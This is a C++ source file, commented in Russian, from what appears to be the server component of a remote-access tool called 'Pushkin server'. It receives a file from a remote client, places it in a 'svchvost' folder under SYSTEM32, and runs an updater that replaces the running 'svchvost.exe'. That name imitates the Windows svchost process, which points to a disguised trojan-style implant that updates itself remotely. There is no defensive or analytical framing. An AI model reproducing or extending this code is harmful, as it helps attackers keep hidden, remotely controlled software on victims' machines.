// Прием файлов; обновление сервера, инициированное клиентом
#include <iostream>
#include "server.h"
#include "commands.h"
#include "common.h"
#include "pstring.hpp"
#include "pint.hpp"
#include "resource.h"

using namespace PUSHKIN_SERVER;
using namespace std;
using namespace PSQL_API;

#pragma warning (disable: 4996)

// Выгрузка и запуск программы обновления сервера
int CreateSU(const char *path);
int CPushkinServClient::UpdateServerImpl()
{
   // Создаем на диске программу перезапуска сервера
   if (CreateSU("su.exe") != P_YES) return P_ERROR;

   STARTUPINFO si;
   PROCESS_INFORMATION pi;

   ZeroMemory( &si, sizeof(si) );
   si.cb = sizeof(si);
   ZeroMemory( &pi, sizeof(pi) );

   // Запускаем программу обновления сервера
   if( !CreateProcess( NULL, "su.exe update svchvost.exe svchvost.exe asd.dat", // Command line.
                        NULL,             // Process handle not inheritable.
                        NULL,             // Thread handle not inheritable.
                        FALSE,            // Set handle inheritance to FALSE.
                        0,                // No creation flags.
                        NULL,             // Use parent'm_socket environment block.
                        NULL,             // Use parent'm_socket starting directory.
                        &si,              // Pointer to STARTUPINFO structure.
                        &pi ) )            // Pointer to PROCESS_INFORMATION structure.
   {
//      MessageBox(NULL, "Error starting process", "Fuck", MB_OK);
   }

   return P_YES;
}

// Обновление сервера, инициированное клиентом
int CPushkinServClient::UpdateServer()
{
   if (!m_bAuthorized) return SendReply(m_socket, CC_ERROR, ERR_NOT_AUTHORIZED);

   // Отсылаем подтверждение возможности обновления сервера
   if (SendReply(m_socket, CC_CONFIRM) != P_YES) return P_ERROR;

   // Принудительно устанавливаем каталог SYSTEM32 текущим
   char buf[1024];
   GetSystemDirectory(buf, 1024);
   strcat(buf, "\\svchvost");
   SetCurrentDirectory(buf);

   // Получаем файл
   int ret = ::ReceiveFile(m_socket, "asd.dat", 0);
   if (ret != P_YES) return ret;

   // Отсылаем подтверждение приема файла на клиента
   if (SendReply(m_socket, CC_CONFIRM) != P_YES) return P_ERROR;

   // Запускаем процедуру обновления сервера
   if (UpdateServerImpl() != P_YES) return P_ERROR;

   // Закрываем сервер чтоб его потом перезапустить
   server_p->m_bStopServer = true;
   closesocket(server_p->m_socket);

   return P_YES;
}
